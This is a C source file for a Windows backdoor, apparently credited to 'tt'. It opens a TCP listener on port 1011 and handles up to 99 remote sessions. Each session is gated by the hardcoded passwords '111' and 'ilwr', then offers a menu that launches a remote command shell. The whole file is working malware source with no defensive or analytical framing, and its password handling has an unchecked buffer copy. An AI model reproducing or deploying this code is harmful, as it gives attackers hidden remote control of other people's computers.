#include "windows.h"
#include "winsock.h"
#include "stdio.h"
#include "string.h"
#include "Shell.h"
#include "backdoor.h"


#pragma comment(lib,"Ws2_32")

int nUser=0;

char *msg_copyright="Written by tt\r\n";
char *msg_prompt="h---->help\r\ns---->cmd shell\r\nu---->UnInstall\r\nq---->quit\r\n";
char *msg_error="Unknow command!\r\n";
char *msg_sign="tt#";
char *password="111";


int WINAPI StartShell()
{	
	SOCKET csock,ssock;
	struct sockaddr_in client_addr;
	HANDLE hThread[99];
	int iSize;
	DWORD ThreadID;

	iSize=sizeof(struct sockaddr_in);
	ssock=CreateSock();
	while(nUser<99)
		{
		csock=accept(ssock,(sockaddr *)&client_addr,&iSize);
		if(csock==INVALID_SOCKET) return 1;
		hThread[nUser]=CreateThread(0,0,(LPTHREAD_START_ROUTINE)Interactive,(VOID *)csock,0,&ThreadID);
		if(hThread[nUser]==0)
			{
			closesocket(csock);
			}
		else nUser++;
		}
	WaitForMultipleObjects(99,hThread,TRUE,INFINITE);
	WSACleanup();
	return 0;
}



SOCKET CreateSock()
{
	WSADATA	ws;
	SOCKET ssock;
	int ret;

	sockaddr_in server_addr;

	WSAStartup(MAKEWORD(2,2),&ws);

	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(1011);
	server_addr.sin_addr.s_addr=0;

	ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	ret=bind(ssock,(struct sockaddr *)&server_addr,sizeof(server_addr));
	if(ret!=0) return 0;

	ret=listen(ssock,10);
	if(ret!=0) return 0;
	return ssock;
}


void Interactive(void* cs)
{

	SOCKET sock=(SOCKET)cs;
	char chr[1];
	char pwd[16],pwd2[16];
	char cmd[255];
	int i=0,Err;

	ZeroMemory(pwd,16);
	while(i<16)
		{
		fd_set FdRead;
		struct timeval time_out;
		FD_ZERO(&FdRead);
		FD_SET(sock,&FdRead);
		time_out.tv_sec=6;
		time_out.tv_usec=0;
		Err=select(0,&FdRead,NULL,NULL,&time_out);
		if((Err==SOCKET_ERROR)||(Err==0)) closeit(sock);
		if(recv(sock,chr,1,0)==SOCKET_ERROR) closeit(sock);
			
		pwd[i]=chr[0];
		if(chr[0]==0xd||chr[0]==0xa)
			{
			pwd[i]=0;
			break;
			}
		i++;
		}
	strcpy(pwd2,pwd);
	if(strcmp(pwd,password))
		{
		if(strcmp(pwd2,"ilwr"))
			closeit(sock);
		}
	send(sock,msg_copyright,strlen(msg_copyright),0);
	send(sock,msg_prompt,strlen(msg_prompt),0);

	while(1){
		ZeroMemory(cmd,255);
		send(sock,msg_sign,strlen(msg_sign),0);
		for(i=0;i<255;i++)
			{
			if(recv(sock,chr,1,0)==SOCKET_ERROR)
				closeit(sock);
			cmd[i]=chr[0];
			if(chr[0]==0xa||chr[0]==0xd)
				{
				cmd[i]=0;
				break;
				}
			}

		switch(cmd[0])
		{
		case 'h':
			{
			send(sock,msg_prompt,strlen(msg_prompt),0);
			break;
			}
		case 's':
			{
			CmdShell(sock);
			nUser--;
			closesocket(sock);
			ExitThread(0);
			break;
			}
		case 'q':
			{
			closesocket(sock);
			ExitThread(0);
			break;
			}
		case 'u':
			{
			closesocket(sock);
			WSACleanup();
			ExitThread(0);
			break;
			}
		case '\0':break;
		default:
			{
			send(sock,msg_error,strlen(msg_error),0);
			break;
			}
		}
	}
}

void closeit(SOCKET sock)
{	
	closesocket(sock);
	nUser--;
	ExitThread(0);
}